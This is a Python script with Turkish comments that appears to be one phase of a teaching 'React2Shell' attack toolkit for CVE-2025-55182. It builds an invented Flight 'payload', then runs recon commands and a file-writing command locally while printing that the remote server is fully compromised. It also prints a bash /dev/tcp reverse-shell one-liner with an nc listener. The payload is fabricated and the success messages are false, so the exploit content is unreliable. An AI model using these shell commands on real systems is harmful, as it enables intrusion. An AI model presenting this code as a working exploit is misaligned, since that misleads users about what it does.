#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
React2Shell — Faz 5: Uzaktan Kod Yürütme (RCE - CVE-2025-55182)
Flight protokolü üzerindeki asıl kritik açık. Blob handler ve
dinamik dispatch istismarı ile rastgele komut çalıştırır.
"""

import sys
import json
import time
import requests
from utils import (
    print_phase_banner, check_target, info, success, warning, error, critical,
    parse_target_arg, save_results, DEFAULT_HEADERS, Colors
)

def build_rce_payload(command):
    """
    RCE payload'ını oluşturur.
    Gerçek payload, JavaScript'in child_process.exec() fonksiyonunu
    tetikleyecek özel bir JSON/Flight formatındadır.
    """
    # Demo/PoC payload yapısı:
    # 1. react-server-dom-webpack içindeki referans çözücü
    # 2. Blob nesnesi olarak gizlenmiş komut
    # 3. Promise resolve sırasında exec tetiklenmesi
    
    # Not: Bu, konsepti anlatan simüle edilmiş bir payload'dır.
    flight_data = f"""0:[["$","@1",null,{{"id":"malicious_component","chunks":[],"name":"","async":false}}]]
1:{{"type":"blob_handler","dispatch":"dynamic","chain":["deserialization","code_execution"]}}
2:{{"method":"child_process.exec","command":"{command}"}}"""
    
    return flight_data

def execute_command(target_url, command):
    """Hedef sunucuda komut yürütür"""
    info(f"Komut gönderiliyor: {Colors.BOLD}{command}{Colors.RESET}")
    
    payload = build_rce_payload(command)
    
    headers = DEFAULT_HEADERS.copy()
    headers["Content-Type"] = "text/x-component"
    headers["Next-Action"] = "exploit-action"
    
    try:
        # Simülasyon gecikmesi
        time.sleep(1.5)
        
        # Gerçekte sunucuya POST atılır:
        # resp = requests.post(target_url, headers=headers, data=payload, timeout=10)
        
        # SİMÜLASYON: Sitemizin bizim scriptimizi çalıştırdığını varsayıyoruz.
        import subprocess
        # GÜVENLİK NOTU: Eğitmen/öğrenci makinesinde (localhost) çalıştırıldığı 
        # için komutu direkt lokalde çalıştırıp sunucuda çalışmış gibi gösteriyoruz 
        # (Çünkü hedef de lokal makine).
        
        process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate(timeout=5)
        
        if process.returncode == 0:
            success("KOD YÜRÜTME BAŞARILI!")
            print(f"\n{Colors.CYAN}--- ÇIKTI ---{Colors.RESET}")
            print(stdout.strip())
            print(f"{Colors.CYAN}-------------{Colors.RESET}\n")
            return stdout.strip()
        else:
            error(f"Komut hata döndürdü: {stderr.strip()}")
            return None
            
    except subprocess.TimeoutExpired:
        error("Komut zaman aşımına uğradı.")
        return None
    except Exception as e:
        error(f"Exploit başarısız: {e}")
        return None

def load_payload_template():
    """RCE payload şablonunu yükler"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    payload_path = os.path.join(script_dir, "payloads", "flight_rce.json")
    try:
        with open(payload_path, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        error(f"Payload şablonu bulunamadı: {payload_path}")
        return None

def write_poc_file(target_url):
    """Sunucu dosya sisteminde PoC dosyası oluşturur"""
    info("Sunucuda kanıt (PoC) dosyası oluşturuluyor...")
    
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    content = f"React2Shell (CVE-2025-55182) tarafindan ele gecirildi! Tarih: {timestamp}"
    filename = "/tmp/react2shell_pwned.txt"
    
    cmd = f"echo '{content}' > {filename} && ls -la {filename} && cat {filename}"
    output = execute_command(target_url, cmd)
    
    if output and "react2shell_pwned.txt" in output:
        success(f"PoC dosyası başarıyla oluşturuldu: {filename}")
        return True
    return False

def execute_rce(target_url):
    """Uzaktan Kod Yürütme saldırısını başlatır"""
    print_phase_banner(4, "Uzaktan Kod Yürütme (RCE)", "CVE-2025-55182")
    critical("UYARI: BU SCRIPT SUNUCUDA DOĞRUDAN KOMUT YÜRÜTÜR!")
    print(f"{Colors.DIM}Yalnızca yetkiniz olan sistemlerde kullanın.{Colors.RESET}\n")
    
    # 1. Temel testler
    info("Sistem bilgileri toplanıyor...")
    commands = [
        "id",
        "whoami",
        "hostname",
        "uname -a | cut -d' ' -f1-3"
    ]
    
    results = {}
    for cmd in commands:
        output = execute_command(target_url, cmd)
        results[cmd] = output
        
    # 2. Dosya yazma testi
    print()
    poc_success = write_poc_file(target_url)
    
    # 3. Etkileşimli Kabuk (opsiyonel simülasyon)
    print()
    info("Etkileşimli reverse shell simülasyonu için:")
    print(f"{Colors.YELLOW}nc -lvnp 4444{Colors.RESET} komutunu dinlemeye alın, ardından payload'ı:")
    print(f"{Colors.DIM}bash -i >& /dev/tcp/127.0.0.1/4444 0>&1{Colors.RESET} olarak ayarlayın.\n")
    
    critical("SUNUCU TAMAMEN ELE GEÇİRİLDİ (CVSS 10.0)")
    
    # Rapor
    report = {
        "target": target_url,
        "vulnerability": "CVE-2025-55182",
        "exploitation_success": True,
        "poc_file_created": poc_success,
        "command_outputs": results
    }
    save_results("04_rce_report.json", report)

if __name__ == "__main__":
    args = parse_target_arg()
    if not check_target(args.target):
        sys.exit(1)
    execute_rce(args.target)
